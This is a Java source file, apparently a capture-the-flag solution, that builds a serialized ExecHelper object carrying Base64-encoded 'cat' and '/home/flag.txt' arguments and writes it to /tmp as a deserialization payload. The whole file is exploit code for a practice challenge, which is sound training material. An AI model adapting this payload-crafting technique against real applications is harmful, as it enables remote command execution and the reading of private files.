package com.snykctf.serialsnyker;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class Main {
    public static void main(String[] args) {

        Base64Helper[] b = new Base64Helper[2];
        Base64Helper ob = new Base64Helper("Y2F0"); // cat
        Base64Helper ob1 = new Base64Helper("L2hvbWUvZmxhZy50eHQ="); // /home/flag.txt

        try {
            b[0] = ob;
            b[1] = ob1;
            ExecHelper vo1 = new ExecHelper(b);
            FileOutputStream fileOut = new FileOutputStream("/tmp/ValueObject.ser");
            ObjectOutputStream out = new ObjectOutputStream(fileOut);
            out.writeObject(vo1);
            out.close();
            fileOut.close();

        }
        catch (IOException e){
            System.out.println(e);
        }


    }
}